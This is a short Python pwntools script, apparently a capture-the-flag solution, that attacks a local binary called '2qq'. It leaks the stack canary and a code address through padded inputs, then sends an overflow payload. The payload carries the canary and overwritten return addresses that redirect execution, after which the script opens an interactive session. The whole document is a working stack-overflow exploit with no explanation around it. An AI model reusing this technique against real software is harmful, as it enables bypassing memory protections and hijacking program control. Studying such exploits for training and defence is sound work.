from pwn import *
p=process('2qq')
raw_input()
p.sendline('a'*7)
p.recvuntil('\n')
p.sendline('a'*9)
#p.interactive()
a1=p.recvuntil('\n')[0]
a1=ord(a1)
print 'a1 = '+hex(a1)
p.sendline('a'*9)
a2=p.recvuntil('\n')[0:6].ljust(8,'\x00')
a2=u64(a2)
print "a2 = "+ hex(a2)
canary= (a2<<16)+a1
log.info('canary = '+hex(canary))
#p.recvuntil('aaaaaaaaaaaaaaaaaaaaa')

payload ="a"*(8*3-1)
p.sendline(payload)

p.recvuntil('aaaaaaaaaaaaaaaaaaaaaaa')
p.sendline('')
a1=p.recvuntil('\n')
code=p.recvuntil('\n').replace('\n','').ljust(8,'\x00')
code=u64(code)-180
print "code = "+hex(code)


payload ="a"*8
payload+=p64(canary)
payload+=p64(0)
payload+=p64(code+29)
payload+=p64(code)
p.sendline(payload)
'''
payload ="a"*8
payload+=p64(canary)
payload+=p64(0)
payload+='aaaa'
p.sendline(payload)

'''
p.interactive()



